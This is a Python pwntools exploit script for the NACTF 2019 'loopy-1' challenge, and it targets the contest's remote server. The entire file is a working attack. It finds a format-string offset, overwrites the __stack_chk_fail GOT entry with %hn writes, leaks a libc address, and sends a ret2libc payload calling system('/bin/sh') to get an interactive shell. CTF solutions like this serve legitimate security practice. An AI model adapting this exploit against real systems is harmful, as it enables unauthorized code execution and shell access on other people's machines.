from pwn import *

binary = ELF("./loopy-1")

def offset_finder():
    for x in range (1, 100):
        #p = remote("shell.2019.nactf.com", 31283)
        p = process("./loopy-1")
        print "Offset number {}".format(x)

        payload = ""
        #payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("You typed: ")
        stack_value = p.recv()
        if stack_value.find("637") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    #p = process("./loopy-1")
    p = remote("shell.2019.nactf.com", 31732)
    got_canary = binary.got["__stack_chk_fail"]
    printf_plt = binary.plt['printf']
    printf_got = binary.got['printf']
    vuln = binary.symbols['vuln']
    #libc = ELF("libc6_2.23-0ubuntu10_i386.so", checksec = False)
    libc = ELF("morelibc.so.6", checksec = False) #remote libc

    payload = ""
    payload += p32(got_canary)
    payload += p32(got_canary + 2)
    payload += "%7${}p".format(0x91a2 - len(payload))
    payload += "%7$hn"
    payload += "%{}p".format(0x10804 - 0x91a2)
    payload += "%8$hn"
    payload += "%35$p"

    payload += 'A'* (64 - len(payload))
    payload += p32(vuln)


    p.sendlineafter('>', payload)
    
    p.recvuntil("0x1")
    libc_leak = int(p.recv(10), 16)
    log.info("Libc leak : 0x{0:x}".format(libc_leak))
    libc_base = libc_leak - 0x1ab41 #libc start main remote
    log.info("Libc base : 0x{0:x}".format(libc_base))
    libc_system = libc_base + libc.symbols["system"]
    log.info("Libc system : 0x{0:x}".format(libc_system))
    libc_binsh = libc_base + libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : 0x{0:x}".format(libc_binsh))

    payload = ""
    payload += "A" * 80
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)

    p.sendline(payload)

    #gdb.attach(p, """
    #            b *vuln+112
    #            c
    #            c
    #            """)

    p.interactive()

if __name__ == "__main__":
    exploit()